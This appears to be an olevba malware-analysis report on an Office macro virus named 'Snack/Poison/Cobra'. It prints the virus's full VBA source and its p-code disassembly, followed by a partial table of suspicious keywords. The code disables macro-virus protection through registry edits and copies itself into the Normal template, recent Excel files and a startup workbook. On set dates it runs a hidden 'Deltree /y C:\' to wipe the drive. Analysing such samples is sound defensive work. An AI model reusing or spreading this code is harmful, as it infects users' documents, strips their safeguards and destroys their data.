olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Snack
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Snack <->>- Poison <->>- Cobra
'Macros By Liton

Private Sub Document_Open()
On Error Resume Next
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set Xla = CreateObject("Excel.Application")
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
IString = NT.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
End If
IString = AD.Lines(1, 1)
If IString <> DString Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
End If
With Options
.VirusProtection = False: .SaveNormalPrompt = False
End With
If System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") <> "0" Then
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
End If
If Xla.Name = "Microsoft Excel" Then
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") <> "" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
End If
For i = 1 To 4
GetName = "File" + Trim(Str(i))
FilName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List", GetName)
If FilName <> "" Then
Set GO = GetObject(FilName)
If GO.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines > 0 Then
GO.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines 1, GO.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
End If
GO.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
GO.Save
End If
Next
StartPath = Xla.Application.StartupPath
If UCase(Dir(StartPath + "\Book1.")) <> "BOOK1" Then
Set WrkBook = Xla.Workbooks.Add
WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.SaveAs StartPah & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
WrkBook.Close
Else
Set WrkBook = GetObject(StartPath + "\Book1.")
If WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines > 0 Then
WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines 1, WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
End If
WrkBook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
WrkBook.Save
Xla.Quit
End If
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Not ready reading drive C", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub
Private Sub WorkBook_Deactivate()
On Error Resume Next
Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkBook").CodeModule
IString = AW.Lines(1, 1)
DString = "'Snack <->>- Poison <->>- Cobra"
If IString <> DString Then
AW.DeleteLines 1, AW.CountOfLines
AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
End If
IString = TW.Lines(1, 1)
If IString <> DString Then
TW.DeleteLines 1, TW.CountOfLines
TW.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
Set WOBJ = CreateObject("Word.Application")
If WOBJ.Name = "Microsoft Word" Then
Set NT = WOBJ.NormalTemplate
MS = NT.Path
If NT.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines > 0 Then
NT.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, NT.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
NT.VBProject.VBComponents("ThisDocument").CodeModule.InsertLines 1, AW.Lines(1, AW.CountOfLines)
End If
WOBJ.Quit
End If
If (Month(Now) = 2 And Day(Now) = 21) Or (Month(Now) = 3 And Day(Now) = 26) Or (Month(Now) = 5 And Day(Now) = 1) Or (Month(Now) = 8 And Day(Now) = 15) Or (Month(Now) = 12 And Day(Now) = 16) Then
MsgBox "Not ready reading drive C", vbOKOnly + vbCritical, "Cobra"
Shell "Deltree /y C:\", vbHide
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSOffice.Snack - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Snack
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 12179 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001E "Snack <->>- Poison <->>- Cobra"
' Line #1:
' 	QuoteRem 0x0000 0x000F "Macros By Liton"
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Open())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #6:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set Xla 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #9:
' 	LitStr 0x001F "'Snack <->>- Poison <->>- Cobra"
' 	St DString 
' Line #10:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #15:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld Xla 
' 	MemLd New 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #27:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0058 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #29:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0047 "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #32:
' 	LitStr 0x0004 "File"
' 	Ld i 
' 	ArgsLd Str 0x0001 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	St GetName 
' Line #33:
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List"
' 	Ld GetName 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St FilName 
' Line #34:
' 	Ld FilName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #35:
' 	SetStmt 
' 	Ld FilName 
' 	ArgsLd GetObject 0x0001 
' 	Set GoSub 
' Line #36:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld GoSub 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	Ld GoSub 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	Ld Xla 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	St StartPath 
' Line #44:
' 	Ld StartPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	Ne 
' 	IfBlock 
' Line #45:
' 	SetStmt 
' 	Ld Xla 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set WrkBook 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	Ld StartPah 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld WrkBook 
' 	ArgsMemCall SaveAs 0x0003 
' Line #48:
' 	Ld WrkBook 
' 	ArgsMemCall Close 0x0000 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	SetStmt 
' 	Ld StartPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd GetObject 0x0001 
' 	Set WrkBook 
' Line #51:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #52:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld WrkBook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #55:
' 	Ld WrkBook 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	Ld Xla 
' 	ArgsMemCall Quit 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #60:
' 	LitStr 0x0019 "Not ready reading drive C"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x0005 "Cobra"
' 	ArgsCall MsgBox 0x0003 
' Line #61:
' 	LitStr 0x000E "Deltree /y C:\"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub WorkBook_Deactivate())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AW 
' Line #67:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkBook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set TW 
' Line #68:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AW 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #69:
' 	LitStr 0x001F "'Snack <->>- Poison <->>- Cobra"
' 	St DString 
' Line #70:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld AW 
' 	MemLd CountOfLines 
' 	Ld AW 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #72:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AW 
' 	ArgsMemCall InsertLines 0x0002 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TW 
' 	ArgsMemLd Lines 0x0002 
' 	St IString 
' Line #75:
' 	Ld IString 
' 	Ld DString 
' 	Ne 
' 	IfBlock 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld TW 
' 	MemLd CountOfLines 
' 	Ld TW 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #77:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AW 
' 	MemLd CountOfLines 
' 	Ld AW 
' 	ArgsMemLd Lines 0x0002 
' 	Ld TW 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WOBJ 
' Line #80:
' 	Ld WOBJ 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #81:
' 	SetStmt 
' 	Ld WOBJ 
' 	MemLd NormalTemplate 
' 	Set NT 
' Line #82:
' 	Ld NT 
' 	MemLd Path 
' 	St MS 
' Line #83:
' 	LitStr 0x000C "ThisDocument"
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #84:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #85:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AW 
' 	MemLd CountOfLines 
' 	Ld AW 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld WOBJ 
' 	ArgsMemCall Quit 0x0000 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #90:
' 	LitStr 0x0019 "Not ready reading drive C"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x0005 "Cobra"
' 	ArgsCall MsgBox 0x0003 
' Line #91:
' 	LitStr 0x000E "Deltree /y C:\"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndSub 
' Line #94:
' Line #95:
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet4 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet5 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet6 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet7 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet8 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet9 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet10 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet11 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet12 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet13 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet14 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet15 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet16 - 958 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
